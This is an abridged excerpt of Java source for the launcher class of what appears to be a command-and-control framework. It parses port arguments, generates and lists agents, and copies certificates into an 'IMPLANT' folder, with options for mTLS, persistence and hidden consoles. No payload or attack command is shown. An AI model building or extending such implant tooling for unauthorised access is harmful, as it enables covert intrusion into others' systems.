...
public final class Start {
    ...
    private static void ProcessArgs(List<String> Args) {
        ...
        int    Port = parseInt(Arg(Args, "-p", "--port",
                        String.valueOf(Config.GetServerPort())), Config.GetServerPort());
    ...
    private static void GenerateAgent(String AgentId, List<String> Args) {
        try {
            ...
            int    Port        = parseInt(Arg(Args, "-ap", "--agent-port",
                                    String.valueOf(Config.GetServerPort())), Config.GetServerPort());
    ...
    private static void GenerateMultiAgent(List<String> Args) {
        ...
        for (int I = 1; I <= Count; I++) {
            ...
            try { GenerateAgent(Id, Args); Ok++; }
            catch (Exception E) { Logger.Error("Failed " + Id + ": " + E.getMessage()); }
        }
    ...
    private static void ListAgents() {
        try {
            ...
            if (!Files.exists(AgentDir)) {
                Logger.Warn("No agents found — generate with: -a <agent-id>"); return;
            }
            Files.list(AgentDir)
    ...
    private static void DeployAgent(String Id, String CertPath, String Host,
                                     int Port, boolean Mtls, boolean Persist,
                                     boolean HideCon) throws IOException {
        String AgentDir = "IMPLANT/" + Id.toUpperCase();
        Files.createDirectories(Paths.get(AgentDir));
        Files.copy(Paths.get(CertPath),
            Paths.get(AgentDir + "/agent.p12"), StandardCopyOption.REPLACE_EXISTING);
        Files.copy(Paths.get(Config.GetCaPath()),
            Paths.get(AgentDir + "/ca.p12"), StandardCopyOption.REPLACE_EXISTING);
    ...
    private static int parseInt(String S, int Default) {
        try { return Integer.parseInt(S.trim()); } catch (Exception E) { return Default; }
    }
